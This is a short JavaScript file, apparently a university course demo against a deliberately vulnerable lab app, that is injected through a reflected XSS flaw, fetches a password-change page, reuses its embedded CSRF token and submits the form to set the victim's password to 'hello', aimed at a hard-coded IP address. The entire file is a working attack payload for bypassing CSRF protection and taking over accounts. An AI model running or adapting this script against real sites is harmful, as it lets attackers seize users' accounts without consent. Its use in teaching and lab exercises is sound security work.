/*
COMS W4995
CSRF high demo for re-used csrf token

This script loads via RXSS vulnerability
*/

function steal_token(url){
    var xhr = new XMLHttpRequest();
    xhr.responseType = "document"; //parse html
    xhr.open("GET", url);
    xhr.send(null);
    xhr.onload = function(){

        // extract form and use csrf token embedded
        var dom = xhr.responseXML;
        var form = dom.forms[0];

        // set new_password
        form[0].value='hello';
        form[1].value=form[0].value;

        //change action from # to /PA4/vulnerabilities/csrf/
        form.action = url;

        // set value for <input name='Change'>
        // attach input to form
        var change = document.createElement('input');
        change.name = 'Change';
        change.value = 'Change';
        form.appendChild(change);

        //attach form to body
        document.getElementsByTagName('body')[0].appendChild(form);

        //form submit
        //return false to prevent redirect
        form.submit(function(event){
            event.preventDefault();
            return false;
        });

        //print csrf token ??
        console.log(form[3].value);
    }
}

//csrf token
steal_token('http://35.184.56.63/PA4/vulnerabilities/csrf/');
